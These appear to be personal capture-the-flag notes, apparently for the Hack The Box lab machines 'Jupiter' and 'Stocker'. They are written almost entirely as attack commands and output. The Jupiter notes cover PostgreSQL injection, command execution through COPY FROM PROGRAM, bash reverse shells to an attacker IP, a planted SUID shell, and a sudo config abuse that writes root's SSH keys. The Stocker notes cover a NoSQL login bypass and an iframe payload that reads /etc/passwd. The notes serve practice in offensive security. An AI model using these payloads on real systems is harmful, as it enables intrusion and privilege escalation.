"moons","pg_statistic","pg_type","pg_foreign_table","pg_authid","pg_shadow","pg_statistic_ext_data","pg_roles","pg_settings","pg_file_settings","pg_hba_file_rules","pg_config","pg_shmem_allocations","pg_backend_memory_contexts","pg_available_extension_versions","pg_user_mapping","pg_stat_xact_user_functions","pg_replication_origin_status","pg_subscription","pg_attribute","pg_proc","pg_class","pg_attrdef","pg_constraint","pg_inherits","pg_index","pg_operator","pg_opfamily","pg_opclass","pg_am","pg_amop","pg_amproc","pg_language","pg_stat_archiver","pg_stat_bgwriter","pg_stat_wal","pg_stat_progress_analyze","pg_stat_progress_vacuum","pg_stat_progress_cluster","pg_stat_progress_create_index","pg_stat_progress_basebackup","pg_stat_progress_copy","pg_largeobject_metadata","pg_aggregate","pg_statistic_ext","pg_rewrite","pg_trigger","pg_event_trigger","pg_description","pg_cast","pg_enum","pg_namespace","pg_conversion","pg_depend","pg_database","pg_db_role_setting","pg_tablespace","pg_auth_members","pg_shdepend","pg_shdescription","pg_ts_config","pg_ts_config_map","pg_ts_dict","pg_ts_parser","pg_ts_template","pg_extension","pg_foreign_data_wrapper","pg_foreign_server","pg_policy","pg_replication_origin","pg_default_acl","pg_init_privs","pg_seclabel","pg_shseclabel","pg_collation","pg_partitioned_table","pg_range","pg_transform","pg_sequence","pg_publication","pg_publication_rel","pg_subscription_rel","pg_matviews","pg_group","pg_user","pg_policies","pg_rules","pg_views","pg_tables","pg_indexes","pg_sequences","pg_stats","pg_stats_ext","pg_stats_ext_exprs","pg_publication_tables","pg_locks","pg_cursors","pg_available_extensions","pg_prepared_xacts","pg_prepared_statements","pg_seclabels","pg_stat_xact_user_tables","pg_timezone_abbrevs","pg_timezone_names","pg_statio_all_tables","pg_statio_sys_tables","pg_stat_all_tables","pg_stat_xact_all_tables","pg_stat_sys_tables","pg_stat_xact_sys_tables","pg_stat_user_tables","pg_statio_user_tables","pg_stat_all_indexes","pg_stat_sys_indexes","pg_stat_user_indexes","pg_statio_all_indexes","pg_statio_sys_indexes","pg_statio_user_indexes","pg_statio_all_sequences","pg_statio_sys_sequences","pg_statio_user_sequences","pg_stat_activity","pg_stat_replication","pg_stat_slru","pg_stat_wal_receiver","pg_stat_subscription","pg_stat_ssl","pg_stat_gssapi","pg_replication_slots","pg_stat_replication_slots","pg_stat_database","pg_stat_database_conflicts","pg_stat_user_functions","pg_user_mappings","pg_largeobject","information_schema_catalog_name","attributes","applicable_roles","administrable_role_authorizations","check_constraint_routine_usage","character_sets","check_constraints","collations","collation_character_set_applicability","column_column_usage","column_domain_usage","routines","column_privileges","role_column_grants","column_udt_usage","columns","constraint_column_usage","routine_column_usage","constraint_table_usage","domain_constraints","domain_udt_usage","routine_privileges","domains","enabled_roles","schemata","key_column_usage","role_routine_grants","parameters","referential_constraints","routine_routine_usage","routine_sequence_usage","sequences","routine_table_usage","sql_parts","sql_implementation_info","sql_features","sql_sizing","table_constraints","table_privileges","view_table_usage","role_table_grants","tables","transforms","user_mappings","triggered_update_columns","views","triggers","udt_privileges","foreign_data_wrappers","role_udt_grants","data_type_privileges","usage_privileges","role_usage_grants","user_defined_types","element_types","view_column_usage","view_routine_usage","_pg_foreign_servers","_pg_foreign_table_columns","column_options","_pg_foreign_data_wrappers","foreign_table_options","foreign_data_wrapper_options","foreign_server_options","foreign_servers","_pg_foreign_tables","user_mapping_options","foreign_tables","_pg_user_mappings"

SELECT usename FROM pg_user;

[
"postgres",
"grafana_viewer"
]

select pg_read_file('PG_VERSION', 0, 200);

["14\n"]

select pg_ls_dir('./');

["pg_multixact","pg_dynshmem","pg_replslot","postmaster.opts","global","pg_commit_ts","postmaster.pid","pg_wal","pg_tblspc","pg_stat_tmp","pg_xact","pg_notify","pg_logical","pg_snapshots","pg_twophase","base","pg_serial","postgresql.auto.conf","PG_VERSION","pg_stat","pg_subtrans"]

select pg_read_file('/etc/passwd');

["root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:104::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\npollinate:x:105:1::/var/cache/pollinate:/bin/false\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\nsyslog:x:107:113::/home/syslog:/usr/sbin/nologin\nuuidd:x:108:114::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:109:115::/nonexistent:/usr/sbin/nologin\ntss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false\nlandscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin\nusbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\njuno:x:1000:1000:juno:/home/juno:/bin/bash\nlxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false\nfwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\npostgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\ngrafana:x:115:121::/usr/share/grafana:/bin/false\njovian:x:1001:1002:,,,:/home/jovian:/bin/bash\n_laurel:x:998:998::/var/log/laurel:/bin/false\n"]

jovian
postgresql
juno

</rich_text>
        <rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-list-tables">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-list-tables</rich_text>
        <rich_text>

RCE

DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec; 

["uid=114(postgres) gid=120(postgres) groups=120(postgres),119(ssl-cert)"]

send rev shell

/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.31/9001 0&gt;&amp;1\"

DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM '/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.31/9001 0&gt;&amp;1\"';SELECT * FROM cmd_exec;DROP TABLE IF EXISTS cmd_exec;


nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.31] from (UNKNOWN) [10.129.119.98] 57222
bash: cannot set terminal process group (1432): Inappropriate ioctl for device
bash: no job control in this shell
postgres@jupiter:/var/lib/postgresql/14/main$
postgres@jupiter:/var/lib/postgresql/14/main$ whoami
whoami
postgres
postgres@jupiter:/var/lib/postgresql/14/main$ id
id
uid=114(postgres) gid=120(postgres) groups=120(postgres),119(ssl-cert)

python3 -c 'import pty;pty.spawn("/bin/bash")'
control + z
stty raw -echo
fg
export TERM=xterm
stty rows 62 columns 207

run linpeas.sh

/etc/postgresql/14/main/postgresql.conf
/usr/bin/python3 /usr/local/bin/jupyter-notebook --no-browser /opt/solar-flares/flares.ipynb

run pspy64

2023/08/16 10:51:30 CMD: UID=0     PID=1      | /sbin/init 
2023/08/16 10:51:41 CMD: UID=114   PID=22204  | postgres: 14/main: autovacuum worker template0                                                                            
2023/08/16 10:51:53 CMD: UID=114   PID=22205  | 
2023/08/16 10:51:56 CMD: UID=114   PID=22206  | postgres: 14/main: autovacuum worker                                                                                      
2023/08/16 10:51:58 CMD: UID=114   PID=22207  | 
2023/08/16 10:52:01 CMD: UID=0     PID=22208  | /usr/sbin/CRON -f -P 
2023/08/16 10:52:01 CMD: UID=1000  PID=22210  | 
2023/08/16 10:52:01 CMD: UID=1000  PID=22209  | /bin/sh -c /home/juno/shadow-simulation.sh 
2023/08/16 10:52:01 CMD: UID=1000  PID=22211  | rm -rf /dev/shm/shadow.data 
2023/08/16 10:52:01 CMD: UID=1000  PID=22212  | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml 
2023/08/16 10:52:01 CMD: UID=1000  PID=22215  | sh -c lscpu --online --parse=CPU,CORE,SOCKET,NODE 
2023/08/16 10:52:01 CMD: UID=1000  PID=22216  | sh -c lscpu --online --parse=CPU,CORE,SOCKET,NODE 
2023/08/16 10:52:01 CMD: UID=1000  PID=22221  | /usr/bin/python3 -m http.server 80 
2023/08/16 10:52:01 CMD: UID=1000  PID=22222  | /usr/bin/curl -s server 
2023/08/16 10:52:01 CMD: UID=1000  PID=22224  | /usr/bin/curl -s server 
2023/08/16 10:52:01 CMD: UID=1000  PID=22226  | /usr/bin/curl -s server 
2023/08/16 10:52:01 CMD: UID=1000  PID=22231  | cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/ 
2023/08/16 10:52:11 CMD: UID=114   PID=22232  | postgres: 14/main: autovacuum worker moon_namesdb                                                                         
2023/08/16 10:52:26 CMD: UID=114   PID=22233  | /usr/lib/postgresql/14/bin/postgres -D /var/lib/postgresql/14/main -c config_file=/etc/postgresql/14/main/postgresql.conf 
2023/08/16 10:52:41 CMD: UID=114   PID=22234  | postgres: 14/main: autovacuum worker                                                                                      
2023/08/16 10:52:56 CMD: UID=114   PID=22235  | postgres: 14/main: autovacuum worker template1                                                                            
2023/08/16 10:53:11 CMD: UID=114   PID=22236  | postgres: 14/main: autovacuum worker                                                                                      
2023/08/16 10:53:26 CMD: UID=114   PID=22237  | /usr/lib/postgresql/14/bin/postgres -D /var/lib/postgresql/14/main -c config_file=/etc/postgresql/14/main/postgresql.conf 
2023/08/16 10:53:41 CMD: UID=114   PID=22238  | postgres: 14/main: autovacuum worker                                                                                      
2023/08/16 10:53:56 CMD: UID=114   PID=22239  | postgres: 14/main: autovacuum worker                                                                                      
2023/08/16 10:54:01 CMD: UID=0     PID=22240  | /usr/sbin/CRON -f -P 
2023/08/16 10:54:01 CMD: UID=0     PID=22241  | /usr/sbin/CRON -f -P 
2023/08/16 10:54:01 CMD: UID=1000  PID=22242  | /bin/bash /home/juno/shadow-simulation.sh 
2023/08/16 10:54:01 CMD: UID=1000  PID=22243  | rm -rf /dev/shm/shadow.data 
2023/08/16 10:54:01 CMD: UID=1000  PID=22244  | 
2023/08/16 10:54:01 CMD: UID=1000  PID=22247  | sh -c lscpu --online --parse=CPU,CORE,SOCKET,NODE 
2023/08/16 10:54:01 CMD: UID=1000  PID=22248  | lscpu --online --parse=CPU,CORE,SOCKET,NODE 
2023/08/16 10:54:01 CMD: UID=1000  PID=22253  | /usr/bin/python3 -m http.server 80 
2023/08/16 10:54:02 CMD: UID=1000  PID=22254  | /usr/bin/curl -s server 
2023/08/16 10:54:02 CMD: UID=1000  PID=22256  | /usr/bin/curl -s server 
2023/08/16 10:54:02 CMD: UID=1000  PID=22258  | /usr/bin/curl -s server 
2023/08/16 10:54:02 CMD: UID=1000  PID=22263  | /bin/bash /home/juno/shadow-simulation.sh


  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/cp
      args: /bin/bash /dev/shm/bash
      start_time: 3s
           
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/chmod
      args: u+s /dev/shm/bash
      start_time: 3s
      
      
      
-rwsr-xr-x 1 juno     juno     1396520 Aug 16 14:22 bash


save my public ssh key to authorized_keys


  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/cp
      args: /dev/shm/authorized_keys /home/juno/.ssh/
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/chmod
      args: 600 /home/juno/.ssh/authorized_keys
      start_time: 5s
      
      
      
ssh juno@10.129.170.204
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-72-generic x86_64)

Last login: Wed Jun  7 15:13:15 2023 from 10.10.14.23
juno@jupiter:~$
juno@jupiter:~$ whoami
juno
juno@jupiter:~$ id
uid=1000(juno) gid=1000(juno) groups=1000(juno),1001(science)
juno@jupiter:~$ cat user.txt 
d370e2dfcfb475323dad231effebad58

there are jupyter notebook running

/opt/solar-flares/logs

juno@jupiter:/opt/solar-flares/logs$ cat jupyter-2023-08-16-38.log
[W 13:38:37.501 NotebookApp] Terminals not available (error was No module named 'terminado')
[I 13:38:37.515 NotebookApp] Serving notebooks from local directory: /opt/solar-flares
[I 13:38:37.515 NotebookApp] Jupyter Notebook 6.5.3 is running at:
[I 13:38:37.515 NotebookApp] </rich_text>
        <rich_text link="webs http://localhost:8888/?token=94750208b95b61e8aef9524722d4ca220e899d49df8499ab">http://localhost:8888/?token=94750208b95b61e8aef9524722d4ca220e899d49df8499ab</rich_text>
        <rich_text>
[I 13:38:37.515 NotebookApp]  or </rich_text>
        <rich_text link="webs http://127.0.0.1:8888/?token=94750208b95b61e8aef9524722d4ca220e899d49df8499ab">http://127.0.0.1:8888/?token=94750208b95b61e8aef9524722d4ca220e899d49df8499ab</rich_text>
        <rich_text>


login with token


ssh -L 8888:127.0.0.1:8888 juno@10.129.170.204

go to </rich_text>
        <rich_text link="webs http://127.0.0.1:8888">http://127.0.0.1:8888</rich_text>
        <rich_text> on kali

open the notebook flares.ipynb

create cell with reverse shell

import os
os.system("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.31/9001 0&gt;&amp;1'")

nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.31] from (UNKNOWN) [10.129.170.204] 57692
jovian@jupiter:/opt/solar-flares$ whoami
whoami
jovian
jovian@jupiter:/opt/solar-flares$ id
id
uid=1001(jovian) gid=1002(jovian) groups=1002(jovian),27(sudo),1001(science)

user can run sudo

jovian@jupiter:/dev/shm$ sudo -l
Matching Defaults entries for jovian on jupiter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jovian may run the following commands on jupiter:
    (ALL) NOPASSWD: /usr/local/bin/sattrack
    

</rich_text>
        <rich_text link="webs https://github.com/arf20/arftracksat">https://github.com/arf20/arftracksat</rich_text>
        <rich_text>

this is the repo used

it reads config.json

modify /tmp/config.json


{
        "tleroot": "/root/.ssh/",
        "tlefile": "authorized_keys",
        "mapfile": "/usr/local/share/sattrack/map.json",
        "texturefile": "/usr/local/share/sattrack/earth.png",

        "tlesources": [
                "</rich_text>
        <rich_text link="webs http://10.10.14.31/authorized_keys">http://10.10.14.31/authorized_keys</rich_text>
        <rich_text>"
        ],

        "updatePerdiod": 1000,

        "station": {
                "name": "LORCA",
                "lat": 37.6725,
                "lon": -1.5863,
                "hgt": 335.0
        },

        "show": [
        ],

        "columns": [
                "name",
                "azel",
                "dis",
                "geo",
                "tab",
                "pos",
                "vel"
        ]
}


python3 -m http.server 80     
Serving HTTP on 0.0.0.0 port 80 (</rich_text>
        <rich_text link="webs http://0.0.0.0:80/">http://0.0.0.0:80/</rich_text>
        <rich_text>) ...
10.129.170.204 - - [17/Aug/2023 05:59:09] "GET /authorized_keys HTTP/1.1" 200 


ssh root@10.129.170.204  
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-72-generic x86_64)
root@jupiter:~# ls
root.txt  snap
root@jupiter:~# cat root.txt 
5238f7fd1335dd4219580695ae5aa429</rich_text>
      </node>
    </node>
    <node name="Stocker" unique_id="75" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692965714" ts_lastsave="1692965717">
      <node name="nmap" unique_id="76" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692965717" ts_lastsave="1692965994">
        <rich_text>cat nmap/all.nmap             
# Nmap 7.94 scan initiated Fri Aug 25 08:16:50 2023 as: nmap -p- -sC -sV -oA nmap/all -v 10.129.228.197
Nmap scan report for 10.129.228.197
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to </rich_text>
        <rich_text link="webs http://stocker.htb">http://stocker.htb</rich_text>
        <rich_text>
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
# Nmap done at Fri Aug 25 08:17:12 2023 -- 1 IP address (1 host up) scanned in 22.18 seconds</rich_text>
      </node>
      <node name="buster" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692965981" ts_lastsave="1692966096">
        <rich_text>feroxbuster -u </rich_text>
        <rich_text link="webs http://stocker.htb/">http://stocker.htb/</rich_text>
        <rich_text>       

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ </rich_text>
        <rich_text link="webs http://stocker.htb/">http://stocker.htb/</rich_text>
        <rich_text>
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c </rich_text>
        <rich_text link="webs http://stocker.htb/js">http://stocker.htb/js</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://stocker.htb/js/">http://stocker.htb/js/</rich_text>
        <rich_text>
301      GET        7l       12w      178c </rich_text>
        <rich_text link="webs http://stocker.htb/css">http://stocker.htb/css</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://stocker.htb/css/">http://stocker.htb/css/</rich_text>
        <rich_text>
301      GET        7l       12w      178c </rich_text>
        <rich_text link="webs http://stocker.htb/img">http://stocker.htb/img</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://stocker.htb/img/">http://stocker.htb/img/</rich_text>
        <rich_text>
200      GET       40l      241w    18399c </rich_text>
        <rich_text link="webs http://stocker.htb/img/webp/people1.webp">http://stocker.htb/img/webp/people1.webp</rich_text>
        <rich_text>
200      GET       12l       62w     3907c </rich_text>
        <rich_text link="webs http://stocker.htb/img/webp/interior37.webp">http://stocker.htb/img/webp/interior37.webp</rich_text>
        <rich_text>
200      GET        6l       21w     1354c </rich_text>
        <rich_text link="webs http://stocker.htb/img/favicon-32x32.png">http://stocker.htb/img/favicon-32x32.png</rich_text>
        <rich_text>
200      GET       39l      197w    15603c </rich_text>
        <rich_text link="webs http://stocker.htb/img/webp/people23.webp">http://stocker.htb/img/webp/people23.webp</rich_text>
        <rich_text>
200      GET        4l       10w      696c </rich_text>
        <rich_text link="webs http://stocker.htb/img/favicon-16x16.png">http://stocker.htb/img/favicon-16x16.png</rich_text>
        <rich_text>
200      GET       56l      418w    32043c </rich_text>
        <rich_text link="webs http://stocker.htb/fonts/inter-v12-latin-700.woff2">http://stocker.htb/fonts/inter-v12-latin-700.woff2</rich_text>
        <rich_text>
200      GET      122l      561w    41547c </rich_text>
        <rich_text link="webs http://stocker.htb/img/webp/people2.webp">http://stocker.htb/img/webp/people2.webp</rich_text>
        <rich_text>
200      GET       97l      503w    40143c </rich_text>
        <rich_text link="webs http://stocker.htb/fonts/inter-v12-latin-300.woff">http://stocker.htb/fonts/inter-v12-latin-300.woff</rich_text>
        <rich_text>
200      GET       55l      383w    31373c </rich_text>
        <rich_text link="webs http://stocker.htb/fonts/inter-v12-latin-300.woff2">http://stocker.htb/fonts/inter-v12-latin-300.woff2</rich_text>
        <rich_text>
200      GET        1l      268w    13800c </rich_text>
        <rich_text link="webs http://stocker.htb/js/aos.js">http://stocker.htb/js/aos.js</rich_text>
        <rich_text>
200      GET       78l      424w    31843c </rich_text>
        <rich_text link="webs http://stocker.htb/fonts/inter-v12-latin-500.woff2">http://stocker.htb/fonts/inter-v12-latin-500.woff2</rich_text>
        <rich_text>
200      GET        6l      546w    42350c </rich_text>
        <rich_text link="webs http://stocker.htb/css/theme.min.css">http://stocker.htb/css/theme.min.css</rich_text>
        <rich_text>
200      GET      176l     1153w    89907c </rich_text>
        <rich_text link="webs http://stocker.htb/img/webp/interior29.webp">http://stocker.htb/img/webp/interior29.webp</rich_text>
        <rich_text>
200      GET        7l     1222w    79742c </rich_text>
        <rich_text link="webs http://stocker.htb/js/bootstrap.bundle.min.js">http://stocker.htb/js/bootstrap.bundle.min.js</rich_text>
        <rich_text>
403      GET        7l       10w      162c </rich_text>
        <rich_text link="webs http://stocker.htb/img/webp/">http://stocker.htb/img/webp/</rich_text>
        <rich_text>
200      GET       91l      507w    41060c </rich_text>
        <rich_text link="webs http://stocker.htb/fonts/inter-v12-latin-700.woff">http://stocker.htb/fonts/inter-v12-latin-700.woff</rich_text>
        <rich_text>
403      GET        7l       10w      162c </rich_text>
        <rich_text link="webs http://stocker.htb/fonts/">http://stocker.htb/fonts/</rich_text>
        <rich_text>
200      GET       81l      475w    40738c </rich_text>
        <rich_text link="webs http://stocker.htb/fonts/inter-v12-latin-500.woff">http://stocker.htb/fonts/inter-v12-latin-500.woff</rich_text>
        <rich_text>
301      GET        7l       12w      178c </rich_text>
        <rich_text link="webs http://stocker.htb/fonts">http://stocker.htb/fonts</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://stocker.htb/fonts/">http://stocker.htb/fonts/</rich_text>
        <rich_text>
200      GET     2059l    12963w   984134c </rich_text>
        <rich_text link="webs http://stocker.htb/img/angoose.png">http://stocker.htb/img/angoose.png</rich_text>
        <rich_text>
200      GET       20l      129w     9226c </rich_text>
        <rich_text link="webs http://stocker.htb/img/apple-touch-icon.png">http://stocker.htb/img/apple-touch-icon.png</rich_text>
        <rich_text>
200      GET      321l     1360w    15463c </rich_text>
        <rich_text link="webs http://stocker.htb/">http://stocker.htb/</rich_text>
        <rich_text>
[##########&gt;---------] - 18s    93969/180027  0s      found:25      errors:0      
[##########&gt;---------] - 18s    15928/30000   879/s   </rich_text>
        <rich_text link="webs http://stocker.htb/">http://stocker.htb/</rich_text>
        <rich_text> 
[##########&gt;---------] - 18s    15539/30000   873/s   </rich_text>
        <rich_text link="webs http://stocker.htb/js/">http://stocker.htb/js/</rich_text>
        <rich_text> 
[##########&gt;---------] - 18s    15542/30000   874/s   </rich_text>
        <rich_text link="webs http://stocker.htb/css/">http://stocker.htb/css/</rich_text>
        <rich_text> 
[##########&gt;---------] - 18s    15674/30000   882/s   </rich_text>
        <rich_text link="webs http://stocker.htb/img/">http://stocker.htb/img/</rich_text>
        <rich_text>                                                                                                         [##########&gt;---------] - 18s    93973/180027  0s      found:25      errors:0      
[##########&gt;---------] - 18s    15929/30000   878/s   </rich_text>
        <rich_text link="webs http://stocker.htb/">http://stocker.htb/</rich_text>
        <rich_text> 
[##########&gt;---------] - 18s    94081/180027  0s      found:25      errors:0      
[##########&gt;---------] - 18s    15953/30000   878/s   </rich_text>
        <rich_text link="webs http://stocker.htb/">http://stocker.htb/</rich_text>
        <rich_text> 
[####################] - 36s   180027/180027  0s      found:25      errors:0      
[####################] - 35s    30000/30000   856/s   </rich_text>
        <rich_text link="webs http://stocker.htb/">http://stocker.htb/</rich_text>
        <rich_text> 
[####################] - 35s    30000/30000   857/s   </rich_text>
        <rich_text link="webs http://stocker.htb/js/">http://stocker.htb/js/</rich_text>
        <rich_text> 
[####################] - 35s    30000/30000   858/s   </rich_text>
        <rich_text link="webs http://stocker.htb/css/">http://stocker.htb/css/</rich_text>
        <rich_text> 
[####################] - 35s    30000/30000   857/s   </rich_text>
        <rich_text link="webs http://stocker.htb/img/">http://stocker.htb/img/</rich_text>
        <rich_text> 
[####################] - 35s    30000/30000   860/s   </rich_text>
        <rich_text link="webs http://stocker.htb/img/webp/">http://stocker.htb/img/webp/</rich_text>
        <rich_text> 
[####################] - 35s    30000/30000   853/s   </rich_text>
        <rich_text link="webs http://stocker.htb/fonts">http://stocker.htb/fonts</rich_text>
        <rich_text>






gobuster vhost -u </rich_text>
        <rich_text link="webs http://stocker.htb">http://stocker.htb</rich_text>
        <rich_text> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             </rich_text>
        <rich_text link="webs http://stocker.htb">http://stocker.htb</rich_text>
        <rich_text>
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/08/25 08:20:20 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb Status: 302 [Size: 28] [--&gt; /login]
Progress: 4902 / 4990 (98.24%)
===============================================================
2023/08/25 08:20:38 Finished
===============================================================</rich_text>
      </node>
      <node name="exploit" unique_id="79" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692966096" ts_lastsave="1692971343">
        <rich_text>POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 55
Origin: </rich_text>
        <rich_text link="webs http://dev.stocker.htb">http://dev.stocker.htb</rich_text>
        <rich_text>
Connection: close
Referer: </rich_text>
        <rich_text link="webs http://dev.stocker.htb/login">http://dev.stocker.htb/login</rich_text>
        <rich_text>
Cookie: connect.sid=s%3AbpwuZ4U4mHnJb3zEUE7Lf8d1HufU5bO4.Kdk5th2%2BDl%2FlBjxTxJaIe8PyqTCL4frfPd6QFt8EbXk
Upgrade-Insecure-Requests: 1

{"username":{"$ne":"admin"}, "password":{"$ne":"pass"}}



logs in


add some item to cart

purchase item

intercept purchase


modify request


POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: </rich_text>
        <rich_text link="webs http://dev.stocker.htb/stock">http://dev.stocker.htb/stock</rich_text>
        <rich_text>
Content-Type: application/json
Content-Length: 196
Origin: </rich_text>
        <rich_text link="webs http://dev.stocker.htb">http://dev.stocker.htb</rich_text>
        <rich_text>
Connection: close
Cookie: connect.sid=s%3AbpwuZ4U4mHnJb3zEUE7Lf8d1HufU5bO4.Kdk5th2%2BDl%2FlBjxTxJaIe8PyqTCL4frfPd6QFt8EbXk

{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"&lt;iframe src='/etc/passwd' height=1000 width=800&gt;","description":"It's a red cup.","image":"","price":32,"currentStock":4,"__v":0,"amount":2}]}


root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
